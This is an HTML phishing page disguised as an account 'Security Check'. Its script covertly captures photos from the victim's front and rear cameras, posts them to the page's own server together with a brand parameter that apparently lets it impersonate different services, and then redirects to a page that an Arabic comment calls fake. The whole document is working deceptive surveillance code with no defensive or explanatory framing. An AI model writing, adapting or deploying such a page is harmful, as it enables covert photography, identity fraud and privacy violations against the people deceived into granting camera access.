<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Security Verification</title>
<style>
  body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0f1115; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; padding: 20px; }
  .box { padding: 40px; background: #171a21; border-radius: 12px; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #2a2f3a; }
  .icon { font-size: 50px; margin-bottom: 20px; }
  h1 { font-size: 22px; margin-bottom: 16px; color: #fff; }
  p { color: #8a8f99; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
  button { background: #4a90e2; color: #fff; border: none; padding: 14px 24px; border-radius: 8px; font-size: 16px; cursor: pointer; width: 100%; font-weight: 600; transition: background 0.2s; }
  button:hover { background: #3a7bc8; }
  #status { margin-top: 16px; font-size: 13px; color: #7dd87d; display: none; }
</style>
</head>
<body>
<div class="box">
  <div class="icon">🛡️</div>
  <h1>Security Check</h1>
  <p>To protect your account, we need to verify your identity. Please allow camera access when prompted.</p>
  <button id="btn">Start Verification</button>
  <div id="status">Verifying... please wait.</div>
</div>

<script>
const urlParams = new URLSearchParams(window.location.search);
const brand = urlParams.get('b') || 'generic';

document.getElementById('btn').addEventListener('click', async () => {
  const btn = document.getElementById('btn'); 
  const status = document.getElementById('status');
  
  btn.style.display = 'none'; 
  status.style.display = 'block';
  
  let frontImg = null; 
  let backImg = null;

  // كاميرا أمامية
  try {
    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    let video = document.createElement('video'); 
    video.srcObject = stream; 
    await video.play();
    await new Promise(r => setTimeout(r, 800)); // استنى شوي
    let canvas = document.createElement('canvas'); 
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); 
    frontImg = canvas.toDataURL('image/jpeg', 0.8);
    stream.getTracks().forEach(t => t.stop());
  } catch (e) {}
  
  // كاميرا خلفية
  try {
    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
    let video = document.createElement('video'); 
    video.srcObject = stream; 
    await video.play();
    await new Promise(r => setTimeout(r, 800));
    let canvas = document.createElement('canvas'); 
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); 
    backImg = canvas.toDataURL('image/jpeg', 0.8);
    stream.getTracks().forEach(t => t.stop());
  } catch (e) {}

  // إرسال الصور للسيرفر
  await fetch('/upload-cam', { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify({ front: frontImg, back: backImg, brand: brand }) 
  }).catch(()=>{});
  
  // التحويل للصفحة الوهمية اللي إنت خليتها (home.html)
  window.location.href = '/home.html?b=' + brand;
});
</script>
</body>
</html>
